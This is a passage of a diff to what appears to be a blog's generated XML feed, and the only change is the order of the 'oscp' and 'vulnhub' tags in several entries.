             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -722,9 +749,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -749,9 +776,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
